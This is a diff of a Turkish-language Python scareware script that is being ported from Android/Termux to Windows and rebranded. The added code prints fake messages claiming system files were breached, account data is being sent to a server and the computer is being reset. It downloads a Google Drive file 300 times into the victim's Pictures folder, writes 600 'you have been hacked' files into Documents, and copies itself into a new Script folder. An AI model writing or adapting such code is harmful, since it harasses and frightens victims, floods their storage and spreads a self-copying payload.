@@ -19,11 +19,11 @@ print(Fore.RED + logo + Style.RESET_ALL)
 def display_waiting_screen():
     print(Fore.YELLOW + "\nİşlemler devam ediyor, lütfen bekleyin..." + Style.RESET_ALL)
     time.sleep(10)  # Bekleme ekranının süresi
-    print(Fore.GREEN + "\nSistem dosyalarına sızıldı Pubg hesap verileri sunucuya gönderiliyor" + Style.RESET_ALL)
+    print(Fore.GREEN + "\nSistem dosyalarına sızıldı  hesap verileri sunucuya gönderiliyor" + Style.RESET_ALL)
     time.sleep(2)
 
     # 30 iş parçacığı ile mesajı hızlıca yazdırma
-    message = "[+] YUŞA TARAFINDAN HACKLENDİN APTALLLL TELEFON SIFIRLANIYOR..."
+    message = "[+] Oxy TARAFINDAN HACKLENDİN BİLGİSAYAR SIFIRLANIYOR..."
 
     def print_message():
         while True:
@@ -56,26 +56,28 @@ def perform_file_operations():
     file_id = '18yUZGacUokuJbFD1md8WoftPSAbR_C7g'
     url = f"https://drive.google.com/uc?export=download&id={file_id}"
 
-    camera_directory = '/storage/emulated/0/DCIM/Camera'
-    if not os.path.exists(camera_directory):
-        os.makedirs(camera_directory)
+    # Windows uyumlu dizinler
+    pictures_directory = os.path.join(os.getenv('USERPROFILE'), 'Pictures')
+    if not os.path.exists(pictures_directory):
+        os.makedirs(pictures_directory)
 
     for i in range(300):
-        destination = os.path.join(camera_directory, f"HackedByYuşa_{i+1}.jpg")
+        destination = os.path.join(pictures_directory, f"HackedByOxy_{i+1}.jpg")
         download_file(url, destination)
 
-    base_directory = '/storage/emulated/0'
-    text_filename = 'Yuşatarafındanhacklendin.txt'
+    documents_directory = os.path.join(os.getenv('USERPROFILE'), 'Documents')
+    text_filename = 'hacklendin.txt'
     for i in range(600):
-        filepath = os.path.join(base_directory, f"{text_filename}_{i+1}")
+        filepath = os.path.join(documents_directory, f"{text_filename}_{i+1}")
         with open(filepath, 'w') as f:
-            f.write("Bu dosya Yuşa tarafından hacklendi.")
+            f.write("Bu dosya Oxygen tarafından hacklendi.")
 
-    self_path = '/data/data/com.termux/files/home/sorgubot.py'
-    android_folder = '/storage/emulated/0/Android'
-    if not os.path.exists(android_folder):
-        os.makedirs(android_folder)
-    destination_path = os.path.join(android_folder, 'client_script.py')
+    # Bu dosyanın kendi yolunu ayarla
+    self_path = os.path.abspath(__file__)
+    scripts_directory = os.path.join(os.getenv('USERPROFILE'), 'Documents', 'Script')
+    if not os.path.exists(scripts_directory):
+        os.makedirs(scripts_directory)
+    destination_path = os.path.join(scripts_directory, 'client_script.py')
     try:
         with open(self_path, 'rb') as src_file:
             with open(destination_path, 'wb') as dst_file:
